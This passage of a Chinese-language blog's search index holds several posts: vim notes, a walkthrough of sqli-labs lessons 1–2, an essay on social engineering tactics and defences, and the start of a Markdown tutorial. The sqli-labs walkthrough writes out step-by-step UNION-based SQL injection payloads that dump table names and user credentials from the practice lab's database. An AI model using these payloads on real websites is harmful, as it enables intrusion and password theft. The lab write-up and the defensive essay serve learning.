src="/img/%E6%9B%BF%E6%8D%A2%E5%91%BD%E4%BB%A4.jpg" alt="替换命令"></p><h1 id="7-执行shell命令、文件另存为和合并文件"><a href="#7-执行shell命令、文件另存为和合并文件" class="headerlink" title="7.执行shell命令、文件另存为和合并文件"></a>7.执行shell命令、文件另存为和合并文件</h1><p>ls展开整体目录；vi打开相关文件</p><h2 id="7-1shell命令"><a href="#7-1shell命令" class="headerlink" title="7.1shell命令"></a>7.1shell命令</h2><p>查看所有目录 :!</p><h2 id="7-2文件另存为"><a href="#7-2文件另存为" class="headerlink" title="7.2文件另存为"></a>7.2文件另存为</h2><p>文件另存为 :w + 文件名</p><p>局部内容另存为</p><pre><code>第一步：按v，进入可视模式第二步：选择部分，再w + 文件名</code></pre><h2 id="7-3合并文件"><a href="#7-3合并文件" class="headerlink" title="7.3合并文件"></a>7.3合并文件</h2><p>:r + 文件名</p><h2 id="7-4打开多个文件"><a href="#7-4打开多个文件" class="headerlink" title="7.4打开多个文件"></a>7.4打开多个文件</h2><p>vi +</p><pre><code>-o水平并排-O垂直并排</code></pre><p><img src="/img/%E6%89%93%E5%BC%80%E5%A4%9A%E4%B8%AA%E6%96%87%E4%BB%B6.jpg" alt="打开多个文件"></p>]]></content>
      
      
      
        <tags>
            
            <tag> vim编辑器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs大冒险</title>
      <link href="/post/beaf4f1e.html"/>
      <url>/post/beaf4f1e.html</url>
      
        <content type="html"><![CDATA[<h1 id="0-介绍"><a href="#0-介绍" class="headerlink" title="0.介绍"></a>0.介绍</h1><p>很多时候新手在学习sql注入的时候，往往找不到合适的靶场进行练习操作。而sqli-labs就是一个适合新手去练习注入的一个专业的SQL注入练习平台，<br>是一个印度程序员写的程序，用来学习sql注入的一个游戏教程。其中包含了各种各样的注入姿势，并适用于GET和POST等场景，包含了以下注入：</p><ol><li>基于错误的注入（Union Select）<br>字符串<br>整数</li><li>报错注入</li><li>盲注（基于Bool数据类型注入、基于时间注入）</li><li>mysql 读写文件</li><li>更新查询注入（update ）</li><li>插入查询注入（insert ）</li><li>Header头部注入（基于Referer注入、基于UserAgent注入、基于cookie注入）</li><li>二次注入</li><li>绕过WAF<br>绕过黑名单\过滤器\剥离\注释剥离 OR＆AND 剥离空格和注释剥离 UNION和SELECT</li><li>绕过addslashes()函数</li><li>绕过mysql_real_escape_string()函数（在特殊条件下）</li><li>堆叠注入（堆查询注入）<br>等…</li></ol><h1 id="lesson-0"><a href="#lesson-0" class="headerlink" title="lesson 0"></a>lesson 0</h1><blockquote><p>准备工作:</p></blockquote><ul><li><p><a href="https://blog.csdn.net/qq_36618918/article/details/107772254">环境搭建教程</a></p></li><li><p><a href="https://blog.csdn.net/qq_32169923/article/details/51120465">Help1</a></p></li></ul><blockquote><p>mysql数据结构</p></blockquote><p>在练习靶场前我们需要了解以下mysql数据库结构，mysql数据库5.0以上版本有一个自带的数据库叫做information_schema,<br>该数据库下面有两个表一个是tables和columns。tables这个表的table_name字段下面是所有数据库存在的表名。<br>table_schema字段下是所有表名对应的数据库名。columns这个表的colum_name字段下是所有数据库存在的字段名。<br>columns_schema字段下是所有表名对应的数据库。了解这些对于我们之后去查询数据有很大帮助。我们前面机关讲解比较详细后面就比较简单了。</p><h1 id="lesson-1"><a href="#lesson-1" class="headerlink" title="lesson 1"></a>lesson 1</h1><h1 id="1-1判断是否存在sql注入"><a href="#1-1判断是否存在sql注入" class="headerlink" title="1.1判断是否存在sql注入"></a>1.1判断是否存在sql注入</h1><p>1.提示你输入数字值的ID作为参数，我们输入?id&#x3D;1<br><img src="https://img-blog.csdnimg.cn/a2d4edae2a224efd9b1ef485bcef305a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA57OK5raC5piv56aPeXl5eQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="图1"></p><p>2.通过数字值不同返回的内容也不同，所以我们输入的内容是带入到数据库里面查询了。<br><img src="https://img-blog.csdnimg.cn/3ec56a55dfbb4416a1ee931d35369e3a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA57OK5raC5piv56aPeXl5eQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="图2"></p><p><img src="https://img-blog.csdnimg.cn/471cc882a2bf4e61b3e900ce9cc8d474.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA57OK5raC5piv56aPeXl5eQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="图3"></p><p>3.接下来我们判断sql语句是否是拼接，且是字符型还是数字型。</p><p><img src="https://img-blog.csdnimg.cn/faadf05c87824470b850abce5ce5feae.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA57OK5raC5piv56aPeXl5eQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="图4"></p><p><img src="https://img-blog.csdnimg.cn/bfb3344c362946d581bab1db77061cce.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA57OK5raC5piv56aPeXl5eQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="图5"></p><p>4.可以根据结果指定是字符型且存在sql注入漏洞。因为该页面存在回显，所以我们可以使用联合查询。联合查询原理简单说一下，联合查询就是两个sql语句一起查询，两张表具有相同的列数，且字段名是一样的。</p><h1 id="1-2联合注入"><a href="#1-2联合注入" class="headerlink" title="1.2联合注入"></a>1.2联合注入</h1><p>第一步：首先知道表格有几列，如果报错就是超过列数，如果显示正常就是没有超出列数。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;order by 3 --+</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/03cdb359637e40b28141cfba1ecc2a5f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA57OK5raC5piv56aPeXl5eQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="图6"></p><p><img src="https://img-blog.csdnimg.cn/e12ae90285c94fa2b1bdf6e615a9df25.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA57OK5raC5piv56aPeXl5eQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="图7"></p><p>第二步：爆出显示位，就是看看表格里面那一列是在页面显示的。可以看到是第二列和第三列里面的数据是显示在页面的。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;union select 1,2,3--+</span></span><br></pre></td></tr></table></figure><p>第三步：获取当前数据名和版本号，这个就涉及mysql数据库的一些函数，记得就行。通过结果知道当前数据看是security,版本是5.7.26。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;union select 1,database(),version()--+</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/5ca4e32e196546059a05b5460de908b1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA57OK5raC5piv56aPeXl5eQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="图8"></p><p>第四步： 爆表，information_schema.tables表示该数据库下的tables表，点表示下一级。where后面是条件，group_concat()是将查询到结果连接起来。如果不用group_concat查询到的只有user。该语句的意思是查询information_schema数据库下的tables表里面且table_schema字段内容是security的所有table_name的内容。也就是下面表格user和passwd。<br><img src="https://img-blog.csdnimg.cn/d448426b2cc84e88ba229bf9d4e69665.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA57OK5raC5piv56aPeXl5eQ==,size_15,color_FFFFFF,t_70,g_se,x_16" alt="图9"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure><p>第五步：爆字段名，我们通过sql语句查询知道当前数据库有四个表，根据表名知道可能用户的账户和密码是在users表中。接下来我们就是得到该表下的字段名以及内容。</p><p>该语句的意思是查询information_schema数据库下的columns表里面且table_users字段内容是users的所有column_name的内。注意table_name字段不是只存在于tables表，也是存在columns表中。表示所有字段对应的表名。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/5ed25df2b23e463c8e8f6404cf316742.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA57OK5raC5piv56aPeXl5eQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="图10"></p><p>第六步：通过上述操作可以得到两个敏感字段就是username和password,接下来我们就要得到该字段对应的内容。我自己加了一个id可以隔一下账户和密码。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,group_concat(username ,id , password) from users--+</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/4eb042ffd4fc4aab95cb064773f74734.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA57OK5raC5piv56aPeXl5eQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="图11"></p><h1 id="lesson2"><a href="#lesson2" class="headerlink" title="lesson2"></a>lesson2</h1><p>和第一关是一样进行判断，当我们输入单引号或者双引号可以看到报错，且报错信息看不到数字，所有我们可以猜测sql语句应该是数字型注入。那步骤和我们第一关是差不多的，<br><img src="https://img-blog.csdnimg.cn/6af0163f75764d5c829eb69265646b38.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA57OK5raC5piv56aPeXl5eQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="图12"></p><p><img src="https://img-blog.csdnimg.cn/6648d0ad721040fd9e69cd420ee1c9e6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA57OK5raC5piv56aPeXl5eQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="图13"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;</span><br><span class="line">&quot;SELECT * FROM users WHERE id=1 &#x27; LIMIT 0,1&quot;出错信息。</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database(),version()</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(username ,id , password) <span class="keyword">from</span> users</span><br><span class="line"> </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> SQL Injection </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL Injection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅析社会工程手段与防范措施</title>
      <link href="/post/880e50f2.html"/>
      <url>/post/880e50f2.html</url>
      
        <content type="html"><![CDATA[<pre><code>                                    written by Enboy_Yu</code></pre><p>摘要：随着信息时代的发展，社会工程攻击手段之势有如雨后春笋。而传统式网络安全无论在技术维度，还是在相关管理的维度，大抵是集中在不断更迭换代的硬件物质因素和外在行为因素，忽略了本应处于网络安全核心地位的人为心理因素，致使社会工程学攻击已经成为了未来十年内信息安全中的最大隐患。把握社会工程学的心理规律特点,有效地进行信息安全防御,有助于降低个人和社会损失。</p><p>关键词：信息安全，社会工程学，模型，信息搜集</p><h1 id="1工程手段"><a href="#1工程手段" class="headerlink" title="1工程手段"></a>1工程手段</h1><h2 id="1-1-基本概念"><a href="#1-1-基本概念" class="headerlink" title="1.1 基本概念"></a>1.1 基本概念</h2><p>所谓社会工程学，其概念是最早在2002年由凯文·米特尼克在《欺骗的艺术》中提出的。但目前学界对社会工程学并没有一个规范的成文化定义，而根据相关社会工程学案例，可将其总结为：社会工程学是将自然行为、社会制度等作为入口，利用人的心理弱点以及规章制度上的漏洞，布下全套，意图获得其目标信息，最终通过未经授权的路径访问某些重要数据。</p><pre><code>[凯文·米特尼克]：美国著名黑客。在他的《欺骗的艺术》中的描述，可以将社会工程学黑客技术总结为：社会工程学就是通过自然的、社会的和制度上的途径，利用人的心理弱点(如人的本能反应、好奇心、信任、贪婪)以及规则制度上的漏洞，在攻击者和被攻击者之间建立起信任关系，获得有价值的信息，最终可以通过未经授权的路径访问某些重要数据。社会工程学攻击与其他类型攻击的最大区别是：会与受害者进行交互式行为，建立一个陷阱让对方掉入或是伪造身份来建立信任关系都属于典型的社会工程学的手段。</code></pre><p>事实上，随着信息安全技术的发展，人为因素才是信息安全的真正软肋。攻击者利用技术弱点进行信息安全攻击已经渐趋黔驴技穷，是故越来越多的黑客开始转向利用人性弱点，运用社会工程手段渗透。这使他们无需耗费较大代价，便可达其目的。</p><p>当前的大环境也正是社会工程手段的温床：许多信息科技企业在安全技术上投入不菲的资金，可最终导致机密泄露的原因，却往往是人为因素。对于黑客们而言，通过几个用户名、几串数字、几组英文代码，借用社会学攻击手段，加以筛选、整理，就能把你的所有个人情况的基本信息、你在网上留下的一切痕迹等掌握得一清二楚。虽然这些可能是最不起眼，听起来不像“黑客”那么高级的方法。但事实如此，这种无需依托任何黑客软件，更注重研究人性弱点的黑客手法正风兴云蒸。</p><h2 id="1-2攻击特点"><a href="#1-2攻击特点" class="headerlink" title="1.2攻击特点"></a>1.2攻击特点</h2><p>概括性地讲，社会工程学是利用人的心理弱点与制度的漏洞来攻击。基本的意思就是借助一切可能的途径、手段，搜集攻击目标对象的信息，然后利用已知资料攻陷对方。与传统的网络攻击相比，社会工程学攻击具有以下一些特点：</p><p>(1)两面性。在某种程度上，社会工程学主导着新式的信息安全。它是一把双刃剑，既可以帮助安全机关完成预防及侦察工作，也可能被不法分子利用来进行破坏行为。所以其性质取决于我们的重视与使用。</p><p>(2)针对性。社会工程学攻击的核心是利用人为因素的手段来进行攻击。其观点认为，人的行为才是整个信息安全体系中最脆弱的部分。攻击者会针对其目标对象性格中的信任、恐惧、威胁、懒惰、健忘等特点，通过伪造身份、设置陷阱等手段，最终获取自己想要的信息。</p><p>(3)有效性。首先，攻击者不必再把时间和精力浪费在寻找漏洞、破解口令等环节上，而是直接瞄准信息的拥有者，减少了中间环节的同时，还更容易隐藏真实身份。另外，许多信息公司盲目地追求利益的最大化，罔视在雇员信息安全培训上的投资，使得在更多情况下，人比系统更加脆弱。</p><p>我们举一个简明的案例来说明社会工程的手段：假设黑客Adam想要渗透一个网站，但在千辛万苦的检索后并没有发现该网站的漏洞。因此黑客Adam伪造了一封带有特洛伊木马式的陷阱附件的电子邮件，并通过该网站的通讯地址发送该电子邮件欺骗网站管理员Bob，称其已成功入侵该网站，电子邮件附件就是入侵后的图像。如果管理员Bob相信Adam的话或出于谨慎考虑打开附件，Adam将潜入网站的后门，并为后续的入侵工作找到突破。由此观之，我们可以将社会工程攻击提炼为四个步骤：巧妙收集信息、伪装身份获取信息、组织信息设置陷阱和获取攻击权限。<br>社会工程似乎是一个简单的骗局，但却包含着纷繁的心理因素。我们可以防止技术入侵，但谁能时刻警惕心理漏洞呢？毫无疑问，社会工程将是未来对抗安全渗透的一个重要领域。</p><h2 id="1-3攻击类型"><a href="#1-3攻击类型" class="headerlink" title="1.3攻击类型"></a>1.3攻击类型</h2><h3 id="1-3-1基于人类（Human-Based）"><a href="#1-3-1基于人类（Human-Based）" class="headerlink" title="1.3.1基于人类（Human Based）"></a>1.3.1基于人类（Human Based）</h3><p>这是一种围绕人的行为的社会工程学手段。在此类中，我们需要人与人的互动来接触到目标信息。这里列举几种常见的方法：</p><p>(1)伪装<br>这是社工攻击中最为广泛的手段之一。黑客首先通过各种手段成为你经常接触到的熟人，然后逐渐被你企业的其他同事认可，他们时常造访你的企业，并最终赢得信赖，可以在企业中获得许多权限来实施计划，比如访问那些本不应允许的区域或者下班后还能进入办公室等。</p><p>(2)投桃报李<br>通过利益交换的方式达成双方各自利益的行为，成为投桃报李。这类攻击需要长期业务合作达成的非正式关系。利用公司之间的信任关系，可以轻松的获取特定信息的目标人员。</p><p>(3)冒充<br>重要人物冒充 — 假装是部门的高级主管，要求工作人员提供所需信息。<br>求助职员冒充 — 假装是需要帮助的职员，请求工作人员帮助解决问题，借以获得信息。<br>技术支持冒充 — 假装是正在处理网络问题的技术支持人员，要求获得所需信息以解决问题。</p><p>(4)寻求帮助<br>这是经典的社工方法之一。向帮助台和服务人员提出问题、寻求帮助，并最终套取想要的信息，这让他们成为了社会工程学攻击热门目标。</p><h3 id="1-3-2基于网络（Internet-Based）"><a href="#1-3-2基于网络（Internet-Based）" class="headerlink" title="1.3.2基于网络（Internet Based）"></a>1.3.2基于网络（Internet Based）</h3><p>与基于人类线下交往的社工手段相反，这是一种依附于网络空间的社会工程学手段。在此类中，我们只需在虚拟空间布好陷阱来接触到目标信息。这里同样列举几种常见的方法：</p><p>(1)网络钓鱼<br>可以采取多种形式轻易地获取个人信息或凭证。可能是在诱使用户在看起来合法的网站上输入个人凭证，用户名密码等等，该网站会将信息反馈给攻击者。</p><p>(2).水坑攻击<br>一旦攻击者确定了受害者的个人资料，水坑攻击便试图在该人或组织经常访问的网站上进行攻击。这种利用访问会将恶意软件植入到他们的计算机中，例如远程访问木马，从而使攻击者可以开始窃取数据的工作。</p><p>(3)信任攻击<br>攻击者将向受害者提供真正有价值的东西，并以蠕虫的方式侵入目标网络。举个例子，攻击者冒充技术支持人员，帮助你解决了遇到的问题，但同时也说服你输入一行代码（后门）。简而言之，这种攻击很简单，就像提供一块巧克力来换取你的密码。</p><p>(4)诱饵攻击<br>在这里，攻击者通常是通过激发好奇心或说服你运行带有隐藏恶意软件的硬件或软件来诱使受害者执行代码。例如，在办公楼下分发的看上去无辜的U盘，实际上可能包含恶意木马；或者是在人多的地方，故意掉落一些USB接口的硬件等等。</p><p>(5)好感攻击<br>就是指攻击者创造了一个合理的场景，他们诱骗受害者一起玩耍以窃取其信息。比如，攻击者先和你成为朋友，获取你的一些基本信息，然后伪装成你办理业务的银行，骗取受害者钱财。它依赖于与受害者建立虚假的友谊，而受害者无论出于何种原因都会给攻击者带来更多的信息，攻击者再基于信息进行攻击。</p><p>(6)伪身份攻击<br>本质上是将经过高级身份验证的人员跟踪到限制区域内，使用伪装之类的欺骗手段使受害者获得虚假的安全感。举个例子，在现实生活中，你穿着一身电信的工作人员的衣服，提个工具包，可以借此进出保安系统相当完备的企业大楼，如果要求出示证件，伪造一张类似的，并在进出表上填写虚假个人信息。</p><h1 id="2社会工程防范措施"><a href="#2社会工程防范措施" class="headerlink" title="2社会工程防范措施"></a>2社会工程防范措施</h1><p>人性千变万化，而与之相对应的社会工程手段也自是纷繁复杂。尤其随着信息安全技术的不断发展，攻击手段也将也来越多样化，防御手段不可能只是墨守成规，固步自封。</p><p>经由对社会工程学攻击展开对比分析，我们知道社会工程学手段大体包含两个不同的方面：一个是科学技术维度，另一个是人为心理维度。而预防与检测社会工程学攻击，其效果同样和维护操作系统安全的效果同样明显，所以防范策略需要在物理和心理两个层面上都有所动作。我们为维护操作系统安全则需要做到两方面同时部署，一个是从安全技术策略角度，一个是从系统相关管理人员角度。</p><p>安全技术策略需要在物理、网络、操作系统、数据库、中间件等多方面进行设置。但同时也要通过系统管理制度等方面对管理系统的相关人员进行培训，提高信息安全意识，站在网络系统管理员的立场上，尽量不要让“人之间的关系”因素问题介入你的信息安全链路之中。培训用户学习安全策略规定并确保他们遵守，是防范社会工程学攻击的主要办法。为了对付社会工程攻击，要抛弃网络架构刀枪不入之类的幻想，是防范社会工程学攻击的必要保证。</p><p>下面是对防御社会工程学制定的两类策略：</p><p>第一类，对企业而言：</p><p>（1）我们首先应建立事故响应小组。而这应当由来自公司不同关键部门的知识渊博的员工组成，他们要经过良好培训并随时准备对社会工程攻击做出反应，有效地分析出入侵的目的与方式。</p><p>（2）其次，要将规章制度的设立与教育培训相结合。对企业内部进行培训，建立雇员参与机制，制定简单的规则，确定什么是关键信息，提高员工的安全意识。</p><p>（3）再次，要筹备尽可能完善的网络安全管理策略。策略中确定对每个资源管理授权者的同时，还要确定他们可以对用户授予哪些级别的权限。倘若缺少资源管理授权者的信息，就无法掌握究竟哪些人在使用网络。对于主干网络中的关键通信资源，对其可授权范围应尽可能小，范围越小就越容易管理，相对也就越安全，以防止对授权职责的滥用。</p><p>（4）最后，则建立相应预警演练机制。模拟入侵程序，利用模拟环境和测试，来制定相应的对策和解决方法。同时全面应用其他安全技术措施，譬如设立电话录音、客户访问记录、文档等敏感信息的访问等级制度。</p><p>第二类，对个人用户而言：</p><p>（1）当心来路不明的服务提供商发来的电子邮件、即时消息以及电话。在提供任何个人信息前验证其身份的真实性和请求的合法性；</p><p>（2）缓慢并认真地浏览电子邮件、即时消息或短信中的细节。不要让攻击者消息中的急迫性响了判断力；</p><p>（3）信息是预防社会工程攻击的最有力的工具，积极了解如何鉴别和防御网络攻击者；永远要点击来自陌生发送者的电子邮件中的嵌入链接。如果有必要就使用搜索引擎寻找网站或工输入网址；</p><p>（4）永远不要在未知发送者的电子邮件中下载附件，如果有必要，可以在保护视图中打开附拒绝来自陌生人的在线电脑技术帮忙，无论他们声称自己是多么正当；</p><p>（5）使用防火墙来保护计算机设备，及时更新杀毒软件同时启用和设置垃圾邮件过滤；</p><p>（6）保持操作系统和应用软件的更新，及时安装软件供应商发布的安全补丁程序；</p><p>（7）关注网站的链接，有的不法分子对网络链接做了细微的改动，将流量诱导到诈骗等不良网站。<br>。</p><h1 id="3-总结"><a href="#3-总结" class="headerlink" title="3 总结"></a>3 总结</h1><p>网络安全涉及问题极其广泛，入侵攻击手段纷繁复杂，它不仅只是技术问题，而是与社会心理学息息相关。因为并不是所有的服务都是可以凭借单纯的技术手段去入侵的。社会工程学攻击已将黑客技术从大众所认为的单纯的技术问题发展成为了防不胜防的社会学问题，而这社会因素甚至更为重要。</p><p>“习惯”是非常可怕的。一些“后门”常常是出于人的惯性行为，疏忽，制度的不规范、不严密，导致其成为了黑客突破的对象。仔细分析，我们会发现，从社会工程学延伸出以其为首要经典攻击手法，如网络钓鱼、密码心理学以及一些利用社会工程学渗入目标企业或者内部得到所需要信息的大胆手法，皆是利用人性弱点进行攻击的方法。综上所述，重视对安全意识的培养，强化对安全技术的管理，加强对安全审核的策略，建立及时而完备的响应机制，同时注重对个人隐私的保护，才是保障网络信息安全，防范社会工程学攻击的不二法门。</p><p>教育与培训应该成为社会、企业的一个常态化工作。对网络信息安全的培训，同样要加入对社会工程学的课程，借助社会各个资源进行宣传和引导，它不应该成为政法部门专属的宣传工作一一借助媒体、学校、社区工作者都可以成为教育与培训的辅助力量。从而减少个体用户被施以社工渗透的机会，也有助于其他相关方面工作的开展。虽然近些年来，随着信息科技的发展和人们防范意识的增强，对社工渗透有了一定的抵御能力，然而很多人在日常生活中的安全防范意识仍是很薄弱的，只有通过培训和宣传增加对社会工程学知识的了解，强化安全防范意识，使人们培养良好的理性分析习惯，才不会成为下一个被“欺骗的艺术”愚弄的对象。</p><pre><code>参考文献：[1] 肖新光.寻找APT的关键词[J].中国信息安全,2013(10):100-104[2] 张瑜,潘小明,LIU Qingzhong,曹均阔,罗自强.APT攻击与防御[J].清华大学学报：自然科学版,2017,57(11):1127-1133[3] 王治,范明钰,王光卫.信息安全领域中的社会工程学研究[J].信息安全与通信保密,2005(7):229-231 [4] 闫兵.信息安全中的社会工程学攻击研究[J].办公自动化：综合月刊,2008(10):40-4147[5] 薛晨,杨世平.基于社会工程学的入侵渗透的研究[J].贵州大学学报：自然科学版,2015,32(1):81-85[6] 任利宁.浅析社会工程学入侵网络的机制与防范措施[J].兰州工业高等专科学校学报,2009,16(2):7-9</code></pre>]]></content>
      
      
      <categories>
          
          <category> 论文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 社会工程学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MarkDown语法(一)</title>
      <link href="/post/730dd3ed.html"/>
      <url>/post/730dd3ed.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote><p>本文是我初次搭建博客所写，也是首次接触markdown语言，故著博客，是为学习积累。</p><p>版权声明：本文为CSDN博主「witnessai1」的原创文章，原文链接：<a href="https://blog.csdn.net/witnessai1/article/details/52551362">https://blog.csdn.net/witnessai1/article/details/52551362</a></p></blockquote><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><pre><code>0.目录1.斜体和粗体2.分级标题3.超链接    3.1行内式    3.2参考式    3.3自动连接4.锚点5.列表    5.1无序列表    5.2有序列表    5.3定义型列表    5.4列表缩进    5.5包含段落的列表    5.6包含引用的列表    5.7包含代码区块的引用    5.8一个特殊情况</code></pre><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="斜体和粗体"><a href="#斜体和粗体" class="headerlink" title="斜体和粗体"></a>斜体和粗体</h2><p>代码：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="emphasis">*斜体*</span>或<span class="emphasis">_斜体_</span></span><br><span class="line"><span class="strong">**粗体**</span></span><br><span class="line"><span class="strong">**<span class="emphasis">*加粗斜体*</span>**</span></span><br><span class="line">~~删除线~~</span><br></pre></td></tr></table></figure><p>显示效果</p><p><em>斜体</em><br><strong>粗体</strong><br><em><strong>加粗斜体</strong></em><br><del>删除线</del></p><h2 id="分级标题"><a href="#分级标题" class="headerlink" title="分级标题"></a>分级标题</h2><p>第一种写法：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">    这是一个一级标题</span></span><br><span class="line"><span class="section">============================</span></span><br><span class="line"><span class="section">    这是一个二级标题</span></span><br><span class="line"><span class="section">----------------------------</span></span><br></pre></td></tr></table></figure><p>第二种写法：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># 一级标题</span></span><br><span class="line"><span class="section">## 二级标题</span></span><br><span class="line"><span class="section">### 三级标题</span></span><br><span class="line"><span class="section">#### 四级标题</span></span><br><span class="line"><span class="section">##### 五级标题</span></span><br><span class="line"><span class="section">###### 六级标题</span></span><br></pre></td></tr></table></figure><h2 id="超链接"><a href="#超链接" class="headerlink" title="超链接"></a>超链接</h2><p>Markdown 支持两种形式的链接语法： 行内式和参考式两种形式，行内式一般使用较多</p><h3 id="行内式"><a href="#行内式" class="headerlink" title="行内式"></a>行内式</h3><p>语法说明：</p><p>[]里写链接文字，()里写链接地址, ()中的”“中可以为链接指定title属性，title属性可加可不加。title属性的效果是鼠标悬停在链接上会出现指定的 title文字。[链接文字](链接地址 “链接标题”)’这样的形式。链接地址与链接标题前有一个空格。</p><p>代码：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">欢迎来到[<span class="string">冷小宸的博客</span>](<span class="link">https://02lxc.github.io/ &quot;Enboy_Yu&#x27;s Blog&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="参考式"><a href="#参考式" class="headerlink" 